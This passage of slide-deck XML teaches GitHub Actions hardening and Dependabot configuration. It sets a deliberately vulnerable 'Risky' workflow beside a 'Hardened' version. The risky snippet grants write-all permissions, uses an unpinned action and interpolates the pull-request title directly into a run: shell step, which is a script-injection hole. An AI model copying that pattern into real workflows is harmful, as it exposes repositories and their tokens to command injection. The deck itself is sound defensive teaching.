              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F5B400"/>
                </a:solidFill>
              </a:rPr>
              <a:t>→ Artifact + summary</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Hardening the workflows themselves</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Workflows run with a token and secrets, so treat them as production code</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1481328"/>
            <a:ext cx="5394960" cy="384048"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 20000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D7261E"/>
          </a:solidFill>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Risky</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6245352" y="1481328"/>
            <a:ext cx="5394960" cy="384048"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 20000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="26AF72"/>
          </a:solidFill>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Hardened</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Code block"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1956816"/>
            <a:ext cx="5394960" cy="224028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0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF7A7A"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>permissions: write-all</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steps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uses</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>: actions/checkout@v7</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF7A7A"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>  - uses: some-org/some-action@main</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run</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>: |</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF7A7A"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>      echo "${{ github.event.pull_request.title }}"</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Code block"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6245352" y="1956816"/>
            <a:ext cx="5394960" cy="224028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permissions</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>: {}          </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8C93A3"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t># jobs opt in</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steps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uses</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>: actions/checkout@3d3c42e5…  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8C93A3"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t># v7.0.1</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with</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persist-credentials</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>: false</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uses</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>: $/.github/actions/setup-ts</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run</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>: echo </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B8E28A"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"$PR_TITLE"</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env</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PR_TITLE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFC861"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>${{ github.event.pull_request.title }}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Tip Least privilege"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="4434840"/>
            <a:ext cx="2651760" cy="1188720"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8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9" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="4572000"/>
            <a:ext cx="420624" cy="420624"/>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0" name="Icon 10" descr="Lock"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="786750" y="4672950"/>
            <a:ext cx="218724" cy="218724"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1207008" y="4572000"/>
            <a:ext cx="1920240" cy="420624"/>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Least privilege</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="5056632"/>
            <a:ext cx="2423160" cy="53035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333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>permissions: {} at the top, read-only per job</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Tip Pin to a SHA"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3364992" y="4434840"/>
            <a:ext cx="2651760" cy="1188720"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8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4" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3502152" y="4572000"/>
            <a:ext cx="420624" cy="420624"/>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5" name="Icon 15" descr="Tag"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3603102" y="4672950"/>
            <a:ext cx="218724" cy="218724"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4023360" y="4572000"/>
            <a:ext cx="1920240" cy="420624"/>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Pin to a SHA</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3502152" y="5056632"/>
            <a:ext cx="2423160" cy="53035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333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Tags can be moved; commit SHAs cannot</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Tip No token on disk"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6181344" y="4434840"/>
            <a:ext cx="2651760" cy="1188720"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8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9" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6318504" y="4572000"/>
            <a:ext cx="420624" cy="420624"/>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0" name="Icon 20" descr="Key"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6419454" y="4672950"/>
            <a:ext cx="218724" cy="218724"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6839712" y="4572000"/>
            <a:ext cx="1920240" cy="420624"/>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No token on disk</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6318504" y="5056632"/>
            <a:ext cx="2423160" cy="53035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333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>persist-credentials: false on checkout</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Tip Input via env"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8997696" y="4434840"/>
            <a:ext cx="2651760" cy="1188720"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8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4" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9134856" y="4572000"/>
            <a:ext cx="420624" cy="420624"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F06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5" name="Icon 25" descr="Braces"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId6"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="9235806" y="4672950"/>
            <a:ext cx="218724" cy="218724"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Text 26"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9656064" y="4572000"/>
            <a:ext cx="1920240" cy="420624"/>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chemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Input via env</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Text 27"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9134856" y="5056632"/>
            <a:ext cx="2423160" cy="53035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333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Never put ${{ }} of user input in run:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="115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Dependabot keeps everything current</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Version updates, security updates and SHA-pinned actions from one config file</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Code block"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1508760"/>
            <a:ext cx="5760720" cy="429768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400"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8C93A3"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>.github/dependabot.yml</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version</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>: 2</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updates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package-ecosystem</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>: npm      </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8C93A3"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t># handles pnpm</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directory</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>: /ts-app</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schedule</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>: { interval: weekly }</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cooldown</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>: { default-days: 7 }</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groups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dev-dependencies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dependency-type</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>: development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update-types</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>: [minor, patch]</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ignore</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>:                     </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8C93A3"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t># deliberate hold</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dependency-name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>: typescript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versions</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>: [</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B8E28A"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"&gt;=7"</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package-ecosystem</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>: maven</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directory</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>: /java-app</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package-ecosystem</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>: github-actions</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directories</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E4E6EB"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Meiryo UI"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>: [/, /.github/actions/*]</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6629400" y="1554480"/>
            <a:ext cx="512064" cy="512064"/>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6" name="Icon 6" descr="Package"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6752295" y="1677375"/>
            <a:ext cx="266273" cy="266273"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="1517904"/>
            <a:ext cx="4325112" cy="10058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Version updates</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Weekly PRs for npm, Maven and Actions. CI runs on each PR, so a green check means the update is safe to merge.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Icon circle"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6629400" y="2624328"/>
            <a:ext cx="512064" cy="512064"/>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9" name="Icon 9" descr="Layers"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6752295" y="2747223"/>
            <a:ext cx="266273" cy="266273"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="2587752"/>
            <a:ext cx="4325112" cy="10058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Grouped</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="333333"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Minor and patch dev-dependency bumps arrive as one PR instead of many.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
